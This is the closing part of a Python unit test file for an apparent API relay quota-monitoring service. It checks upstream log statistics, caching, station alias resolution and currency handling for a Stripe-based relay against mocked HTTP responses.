                    with patch("astrbot_host.quota_api.request", _FakeRequest(query={"station_id": "syuan", "days": "7"})):
                        res_all = await api._quota_api.upstream_logs()
                    self.assertEqual(res_all["status"], "ok")
                    d_all = res_all["data"]
                    self.assertFalse(d_all["counted_in_private_companion_budget"])
                    self.assertEqual(d_all["total_calls"], 2)
                    self.assertEqual(d_all["subscription_calls"], 1)
                    self.assertEqual(d_all["wallet_calls"], 1)
                    self.assertAlmostEqual(d_all["subscription_cost"], 1.0, places=4)
                    self.assertAlmostEqual(d_all["wallet_cost"], 2.0, places=4)
                    self.assertAlmostEqual(d_all["cache_hit_rate"], 50.0, places=1)
                    self.assertEqual(d_all["token_names"], ["cli-dev", "companion-bot"])
                    self.assertAlmostEqual(d_all["observed_groups"]["vip"], 0.65, places=4)
                    self.assertEqual(log_fetches[0], 1)

                    # Filtered by token_name hits cache (0 new fetches) while keeping full token_names list
                    with patch("astrbot_host.quota_api.request", _FakeRequest(query={"station_id": "syuan", "days": "7", "token_name": "companion-bot"})):
                        res_filt = await api._quota_api.upstream_logs()
                    self.assertEqual(res_filt["status"], "ok")
                    self.assertEqual(log_fetches[0], 1)
                    self.assertTrue(res_filt["data"]["cached"])
                    self.assertEqual(res_filt["data"]["total_calls"], 1)
                    self.assertEqual(res_filt["data"]["token_names"], ["cli-dev", "companion-bot"])

                # 3) resolve_station_for_origin matches alias api.syuan.org <-> aiapi.syuan.org + exposes observed_group_ratios
                resolved = svc.resolve_station_for_origin("https://api.syuan.org/v1")
                self.assertIsNotNone(resolved)
                self.assertEqual(resolved["station_id"], "syuan")
                self.assertEqual(resolved["auth_token"], "tok-syuan-secret")
                self.assertEqual(resolved["user_id"], "12")
                self.assertEqual(resolved["group_name"], "vip")
                self.assertAlmostEqual(resolved["observed_group_ratios"]["vip"], 0.65, places=4)
                self.assertIsNone(svc.resolve_station_for_origin("https://unrelated.example.test"))

                # 3b) Overseas Stripe CUSTOM + default RMB price=7.3 must NOT leak 7.3 as USD fiat_per_base_unit
                def stripe_router(method, url, _kw):
                    if url.endswith("/api/status"):
                        return _FakeResponse(
                            200,
                            {
                                "success": True,
                                "data": {
                                    "system_name": "Global Stripe Relay",
                                    "server_address": "https://stripe.example.test",
                                    "quota_display_type": "CUSTOM",
                                    "quota_per_unit": 500000,
                                    "custom_currency_symbol": "★",
                                    "custom_currency_exchange_rate": 10,
                                    "usd_exchange_rate": 7.3,
                                    "price": 7.3,
                                },
                            },
                        )
                    if url.endswith("/api/user/self"):
                        return _FakeResponse(200, {"success": True, "data": {"id": 99, "quota": 5_000_000, "used_quota": 0, "group": "pro"}})
                    if url.endswith("/api/user/topup/info"):
                        return _FakeResponse(
                            200,
                            {"success": True, "data": {"price": 7.3, "enable_stripe_topup": True, "pay_methods": [{"type": "stripe"}]}},
                        )
                    if "/api/log/self" in url:
                        return _FakeResponse(200, {"success": True, "data": {"items": []}})
                    return _FakeResponse(404, b"")

                svc._session_factory = _mock_factory(stripe_router)[0]
                _, _, tok_stripe = svc.store.read()
                svc.store.upsert_station(
                    tok_stripe,
                    {
                        "id": "stripe-usd",
                        "name": "Global Stripe Relay",
                        "adapter_id": "newapi",
                        "base_url": "https://stripe.example.test",
                        "auth_token": "tok-stripe",
                    },
                )
                await svc.refresh_station("stripe-usd")
                resolved_stripe = svc.resolve_station_for_origin("https://stripe.example.test/v1")
                self.assertIsNotNone(resolved_stripe)
                self.assertEqual(resolved_stripe["fiat_currency"], "USD")
                self.assertIsNone(resolved_stripe["fiat_per_base_unit"])

                # 4) PricingCatalogService injection works safely both standalone & with setter
                cat_svc = api._pricing_catalog_service(Path(tmp), ctrl.session)
                self.assertIsNotNone(cat_svc)

                await close_quota_watch_services(ctrl)

        asyncio.run(run())


if __name__ == "__main__":
    unittest.main()
